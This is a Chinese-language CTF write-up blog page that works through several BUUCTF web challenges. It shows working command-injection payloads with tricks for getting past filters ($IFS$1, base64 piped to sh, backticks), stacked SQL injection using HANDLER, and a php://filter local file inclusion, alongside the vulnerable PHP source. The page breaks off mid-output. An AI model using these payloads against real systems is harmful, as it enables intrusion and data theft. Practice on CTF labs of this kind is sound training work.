<script>"serviceWorker"in navigator&&window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})).them((()=>{"true"!=window.localStorage.getItem("install")&&(window.localStorage.setItem("install","true"),location.reload())}))</script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF 刷题笔记——Web 1 | h-t-m</title><meta name="keywords" content="网络安全,BUUCTF,Web"><meta name="author" content="h-t-m"><meta name="copyright" content="h-t-m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web 刷题正式提上日程！"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF 刷题笔记——Web 1"><meta property="og:url" content="https://h-t-m.top/posts/477423cc/"><meta property="og:site_name" content="h-t-m"><meta property="og:description" content="Web 刷题正式提上日程！"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp"><meta property="article:published_time" content="2022-10-08T05:23:35.000Z"><meta property="article:modified_time" content="2022-10-19T13:49:35.137Z"><meta property="article:author" content="h-t-m"><meta property="article:tag" content="网络安全"><meta property="article:tag" content="BUUCTF"><meta property="article:tag" content="Web"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp"><link rel="shortcut icon" href="/images/~logo.gif"><link rel="canonical" href="https://h-t-m.top/posts/477423cc/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//s4.cnzz.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#132c33"><link rel="apple-touch-icon" sizes="180x180" href="/logo/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/logo/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/logo/favicon-16x16.png"><link rel="mask-icon" href="/logo/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?2b93c7896a6f4dc63301e461b14f5b59";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-214297516-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-214297516-1")</script><script async data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1280663206&amp;web_id=1280663206"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:50,languages:{author:"作者: h-t-m",link:"链接: ",source:"来源: h-t-m",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"BUUCTF 刷题笔记——Web 1",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-10-19 21:49:35"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme"),o=(new Date).getHours();void 0===t?o<=6||o>=18?activateDarkMode():activateLightMode():"light"===t?activateLightMode():activateDarkMode();const n=saveToLocal.get("aside-status");void 0!==n&&("hide"===n?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const a=saveToLocal.get("global-font-size");void 0!==a&&document.documentElement.style.setProperty("--global-font-size",a+"px");const c=()=>{GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")};c(),document.addEventListener("pjax:complete",c)})(window)</script><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/carousel-touch.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading()" title="点击跳过动画"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><img class="load-image" src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif" alt=""></div></a><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/logo.jpg" onerror='onerror=null,src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url('https://pic.h-t-m.ltd/img/BUUCTF-top.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h-t-m</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>所有文章</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>珍藏</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>社交</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>说说</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>关于</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>我</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>她</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>我们</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF 刷题笔记——Web 1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-08T05:23:35.000Z" title="发表于 2022-10-08 13:23:35">2022-10-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-19T13:49:35.137Z" title="更新于 2022-10-19 21:49:35">2022-10-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="BUUCTF 刷题笔记——Web 1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>BUUCTF 刷题笔记——Web 1</h1><h2 id="ACTF2020-新生赛-Exec">[ACTF2020 新生赛]Exec</h2><ul><li><p>启动靶机之后，一个简单的 <kbd>Ping</kbd> 页面，输入任意 <kbd>ip</kbd> 值即可让服务器去 <kbd>Ping</kbd> 对应 <kbd>ip</kbd>，图示输入数字序列也可正常执行，因此大概率是没有过滤的命令行操作，可以直接识别数字化 <kbd>ip</kbd>。</p><img src="0001.webp" alt="" style="zoom:75%"></li><li><p>验证是否为命令注入，以分号分隔，这样会依次执行命令，后接 <kbd>ls</kbd> 命令，若回显目录则此处存在命令注入。结果如图，回显文件名，注入点存在。</p><img src="0002.webp" alt="" style="zoom:75%"></li><li><p>接下来开始寻找 <kbd>flag</kbd> 即可，一般来说 <kbd>flag</kbd> 都在根目录，因此直接使用 <kbd>ls /</kbd>查看根目录。发现目标，使用 <kbd>cat</kbd> 命令打开即夺旗成功。</p><img src="0003.webp" alt="" style="zoom:75%"></li></ul><h2 id="强网杯-2019-随便注">[强网杯 2019]随便注</h2><ul><li><p>打开靶机，有一个输入框，输入 <kbd>1</kbd> 或 <kbd>2</kbd> 会回显不同的内容，在地址栏可以看到数据通过 GET 方式上传。</p><img src="0004.webp" alt="" style="zoom:75%"></li><li><p>在数据后添加单引号发现浏览器回显报错，因此存在 SQL 注入，加入注释符可进一步确认注入点为单引号闭合的字符型注入。</p><img src="0005.ewbp" alt="" style="zoom:75%"></li><li><p>使用 <kbd>order by</kbd> 语句判断所查询的列数，到 <kbd>3</kbd> 开始报错，因此 SQL 语句共查询 <kbd>2</kbd> 列数据，基本可以确定数据分别为此前正常查询时输出的序号与字符串。</p><img src="0006.webp" alt="" style="zoom:75%"></li><li><p>照流程对回显位作基本判断，发现报错了，源码将如下这些 SQL 的关键字均进行了过滤。所幸并没有对 <kbd>show</kbd> 进行过滤，因此堆叠注入还是可以用的。</p><img src="0007.webp" alt="" style="zoom:75%"></li><li><p>分号之后使用 <kbd>show</kbd> 语句查询表名，一般情况下 <kbd>flag</kbd> 会在当前数据库中，因此这里直接查询表。查询出一共有两个表，分别为 <kbd>words</kbd> 与 <kbd>1919810931114514</kbd>，那 <kbd>flag</kbd> 大概率就在这个名字奇怪的表中了。</p><img src="0008.webp" alt="" style="zoom:75%"></li><li><p>继续查询该表中的字段，注意由于字段名为数字序列，所以需要加上反引号包裹。在结果中可以看到，<kbd>flag</kbd> 就在这，夺旗只差一步。</p><img src="0009.webp" alt="" style="zoom:75%"></li><li><p>由于 <kbd>select</kbd> 惨遭过滤，因此数据的查询就需要借助其他力量了：MySQL 中的 <kbd>handler</kbd> 命令同样可以用于查询数据内容。直接使用该命令打开 <kbd>1919810931114514</kbd> 表并读取第一行数据即可，这里给出 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first--+</span><br></pre></td></tr></table></figure></li></ul><h2 id="SUCTF-2019-EasySQL">[SUCTF 2019]EasySQL</h2><ul><li><p>启动靶机，与前一关类似，直接就是一个输入框，标题透露依然是 SQL 注入。直接加上注释发现并无影响，因此为数字型注入。输入几个数据发现直接输入非零数值都会返回 <kbd>1</kbd>，输入 <kbd>0</kbd> 则无回显。</p><img src="0010.webp" alt="" style="zoom:75%"></li><li><p>有零和非零值的区别可以推测存在逻辑关系的判断，在注释符都不起作用的情况下，源码中的 SQL 语句就有可能是以下两种：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [注入数据] <span class="keyword">or</span> [字段] <span class="keyword">from</span> [表名]</span><br><span class="line"><span class="keyword">select</span> [字段] <span class="keyword">from</span> [表名] <span class="keyword">where</span> [定值] <span class="keyword">and</span> [注入数据]</span><br></pre></td></tr></table></figure><p>上述两种具体为哪一种其实也可以判断，直接输入数字后加注释符，若是第一种，则浏览器会回显我们输入的数据，而若是第二种，则回显的数据始终不变。如下图返回了我们输入的数值，因此可以确定使用的查询语句为第一种。</p><img src="0011.webp" alt="" style="zoom:75%"></li><li><p>那就可以注入 <kbd>*,0</kbd>，其中 <kbd>0</kbd> 负责控制逻辑部分，是否为 <kbd>0</kbd> 看心情，主要通过 <kbd>*</kbd> 完成对当前表中所有数据的查询，结果，正好 <kbd>flag</kbd> 就这么跑出来了。</p><img src="0012.webp" alt="" style="zoom:75%"><p>所以该表只有一个字段，字段中也仅有一个数据，就是 <kbd>flag</kbd>。由此也可以判断所使用的 SQL 语句如下，<kbd>[flag]</kbd> 代表 <kbd>flag</kbd> 所在的表或字段。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [注入数据] <span class="keyword">or</span> [flag] <span class="keyword">from</span> [flag]</span><br></pre></td></tr></table></figure></li><li><p>值得注意的是，对于逻辑运算符，使用 <kbd>||</kbd> 基本可以完全替代 <kbd>or</kbd>，因此上文将其认定为 <kbd>or</kbd> 并不严谨，虽然这并不影响我们解题，但多了解区别总是好的。通过堆叠注入的方式将 MySQL 中的 <kbd>sql_mode</kbd> 变量设为 <kbd>PIPES_AS_CONCAT</kbd>，这样就可以将 <kbd>||</kbd> 解析为连接字符 <kbd>,</kbd>，然后执行注入查询若结果不变说明使用的是 <kbd>or</kbd> 运算符，若再次爆出 <kbd>flag</kbd>，那就很有意思了，这就是第二种解法了！事实证明，确实是 <kbd>||</kbd>：</p><img src="0013.webp" alt="" style="zoom:75%"></li></ul><h2 id="GXYCTF2019-Ping-Ping-Ping">[GXYCTF2019]Ping Ping Ping</h2><ul><li><p>打开靶机，提示通过 <kbd>GET</kbd> 方法传送 <kbd>ip</kbd> 地址用于执行 <kbd>Ping</kbd>，与之前关卡类似，直接尝试注入命令 <kbd>ls</kbd>，浏览器回显两个文件，因此存在命令注入，同时 <kbd>flag</kbd> 就在当前目录下的 <kbd>falg.php</kbd> 文件中。</p><img src="0014.webp" alt="" style="zoom:75%"></li><li><p>那么就使用 <kbd>cat</kbd> 命令打开该文件即可，不出意外的话不会出意外，但是出意外了。文件打开失败，还被骂了：</p><img src="0015.webp" alt="" style="zoom:75%"></li><li><p>根据提示，是空格被过滤了，关于空格的绕过那就有很多方法了，可以使用 <kbd>&#60;</kbd>、<kbd>&#60;&#62;</kbd>、字节码形式 <kbd>\x20</kbd>、全局变量 <kbd>&#36;{IFS}</kbd> 等代替空格，但是，实测竟然全部失败了。通过各种测试发现上述字符都被过滤了，其中全局变量 <kbd>&#36;{IFS}</kbd> 是花括号被过滤，而 <kbd>IFS</kbd> 并没有被过滤，因此还可以使用 <kbd>&#36;IFS&#36;1</kbd> 来代替空格，其中 <kbd>&#36;1</kbd> 代表接收的第一个参数，没传参值就是空，<psw>不是空格而是空，NULL</psw>。在这里的作用是防止 <kbd>IFS</kbd> 与后方字符相连造成无法识别，数值使用 <kbd>1~9</kbd> 均可。拼接上述绕过字符后回车，发现空格被成功绕过了，但是又被骂了，因为 <kbd>flag</kbd> 被过滤了。</p><img src="0016.webp" alt="" style="zoom:75%"></li><li><p>尝试在 <kbd>flag</kbd> 中继续插入 <kbd>&#36;1</kbd> 等无值参数以绕过，发现依然会被认出是 <kbd>flag</kbd>，也就是说只要 <kbd>f</kbd>、<kbd>l</kbd>、<kbd>a</kbd>、<kbd>g</kbd> 依次出现就会被过滤。那就传个有值的参数来绕过，在打开 <kbd>flag</kbd> 之前先定义变量 <kbd>b</kbd> 并赋值为 <kbd>ag</kbd> ，在执行 <kbd>cat</kbd> 命令时再将参数传入就可以完成拼接，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;b=ag;cat$IFS$1fl$b.php</span><br></pre></td></tr></table></figure><p>值得注意的是，变量后不可连接字母或数字，如 <kbd>fl%bg.php</kbd> 则会被解析为变量 <kbd>bg</kbd>。实测上述 <kbd>payload</kbd> 成功打开 <kbd>flag</kbd>，由于是 <kbd>php</kbd> 文件，因此需要在调试界面查看：</p><img src="0017.webp" alt="" style="zoom:75%"><p>当然，据此也可推测源代码中用于过滤 <kbd>flag</kbd> 所使用的正则表达式应该如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.*f.*l.*a.*g.*</span><br></pre></td></tr></table></figure></li><li><p>此外，本题还可以使用 <kbd>base64</kbd> 加密传入再解密的形式解题，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>蛮有意思的解法，管道符 <kbd>|</kbd> 会将前一个命令的输出作为后一个程序的输入，所以将我们要执行的命令解密后放进 <kbd>sh</kbd> 执行就完成任务了。</p></li><li><p>还有一个优雅的解法，利用反引号 <kbd>&#96;</kbd> 实现内联执行，即被反引号包裹的数据代表了数据执行后的结果，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure><p>因此程序会打开 <kbd>ls</kbd> 命令查找出来的 <kbd>flag.php</kbd> 与 <kbd>index.php</kbd> 两个文件。</p><img src="0018.webp" alt="" style="zoom:75%"></li></ul><h2 id="极客大挑战-2019-Secret-File">[极客大挑战 2019]Secret File</h2><ul><li><p>打开靶机，问你是否想知道蒋璐源的秘密，除此之外貌似并无可操作之处，打开调试界面发现有一个链接指向网页当前目录下的 <kbd>Archive_room.php</kbd> 文件：</p><img src="0019.webp" alt="" style="zoom:75%"><p>虽然直接在地址栏访问该文件即可打开下一个页面，但是毕竟这里用的是跳转链接，单击才是正确打开方式，至于链接藏在页面的哪里，底部 <kbd>logo</kbd> 上方就是，鼠标点击滑过即可看见。</p><img src="0020.webp" alt="" style="zoom:75%"></li><li><p>打开页面后，提示秘密在链接中，而这个链接则指向网页目录的另一个文件 <kbd>action.php</kbd>。</p><img src="0021.webp" alt="" style="zoom:75%"><p>但是点击这个链接后网页又会打开 <kbd>end.php</kbd> 提示查阅结束，也就是说打开 <kbd>action.php</kbd> 会自动跳转到 <kbd>end.php</kbd>，要想看到里面的内容就只能在跳转前查看。</p><img src="0022.webp" alt="" style="zoom:75%"></li><li><p>那就要抓包了，<kbd>Brup</kbd> 抓到的访问 <kbd>action.php</kbd> 时返回的数据如下，提示访问另一个文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   secr3t.php        </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>那就老老实实打开这个文件看看，浏览器回显了一段代码并且提示 <kbd>flag</kbd> 就在 <kbd>flag.php</kbd> 文件中。可以看出这里存在一个文件包含的程序，文件的路径由我们通过 GET 方法传入，且过滤了含有 <kbd>../</kbd>、<kbd>tp</kbd>、<kbd>input</kbd>、<kbd>data</kbd> 字符的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>直接使用浏览器访问 <kbd>flag.php</kbd>，提示我们已经找到，但是看不到。因此可以认为 <kbd>flag</kbd> 存在与后端文件 <kbd>flag.php</kbd> 中，有必要利用文件包含来读取后端的该文件。</p><img src="0023.webp" alt="" style="zoom:75%"></li><li><p>利用文件包含漏洞读取文件一般使用伪协议 <kbd>php://filter</kbd>，该协议会读取文件并进行筛选与过滤，当然我们只需要他读取即可。由于读取源码文件时会执行源码，所以应对读取的数据进行 <kbd>base64</kbd> 加密，加密后的代码便无法被执行。<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>其中，<kbd>convert.base64-encode</kbd> 负责将数据流加密，<kbd>resource</kbd> 则指定待读取的数据流。执行之后会在浏览器中回显一段 <kbd>base64</kbd> 加密的字符串，即后端 <kbd>flag.php</kbd> 文件内容的密文。</p><img src="0024.webp" alt="" style="zoom:75%"></li><li><p>将上述密文进行 <kbd>base64</kbd> 解密即可看到全文，不仅有 <kbd>flag</kbd>，还有蒋璐源的秘密，<psw>这是梦想吧</psw>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 